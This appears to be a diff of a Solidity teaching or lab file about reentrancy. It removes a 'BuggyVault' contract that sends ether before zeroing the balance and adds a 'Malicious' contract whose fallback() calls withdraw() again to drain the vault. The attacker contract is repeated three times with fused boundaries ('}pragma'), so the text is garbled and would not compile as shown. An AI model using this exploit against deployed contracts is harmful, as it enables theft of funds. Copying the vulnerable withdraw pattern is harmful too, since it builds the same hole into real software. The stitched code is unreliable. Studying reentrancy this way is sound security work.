@@ -33,21 +33,72 @@ pragma solidity ^0.8.7;
 
 import "./IVault.sol";
 import "hardhat/console.sol";
+contract Malicious {
 
+    IVault public vault;
 
-contract BuggyVault is IVault {
-
-    mapping(address=>uint256) public balances;
-    
-    function deposit() external override payable{
-        balances[msg.sender] += msg.value;
+    constructor(IVault _vault) {
+        vault = _vault;
     }
 
-    function withdraw() external override{
-        address payable target = payable(msg.sender);
-        (bool success,) = target.call{value:balances[msg.sender]}("");
-        console.log(success);
-        balances[msg.sender] = 0;
+    function addDeposit() external payable {
+        vault.deposit{value: msg.value}();
+    }
+
+    function withdrawFromVault() external  {
+        vault.withdraw();
+    }
+
+    fallback() external payable{
+        vault.withdraw();
+    }
+}pragma solidity ^0.8.7;
+
+
+import "./IVault.sol";
+import "hardhat/console.sol";
+contract Malicious {
+
+    IVault public vault;
+
+    constructor(IVault _vault) {
+        vault = _vault;
+    }
+
+    function addDeposit() external payable {
+        vault.deposit{value: msg.value}();
+    }
+
+    function withdrawFromVault() external  {
+        vault.withdraw();
+    }
+
+    fallback() external payable{
+        vault.withdraw();
+    }
+}pragma solidity ^0.8.7;
+
+
+import "./IVault.sol";
+import "hardhat/console.sol";
+contract Malicious {
+
+    IVault public vault;
+
+    constructor(IVault _vault) {
+        vault = _vault;
+    }
+
+    function addDeposit() external payable {
+        vault.deposit{value: msg.value}();
+    }
+
+    function withdrawFromVault() external  {
+        vault.withdraw();
+    }
+
+    fallback() external payable{
+        vault.withdraw();
     }
 }
 ```
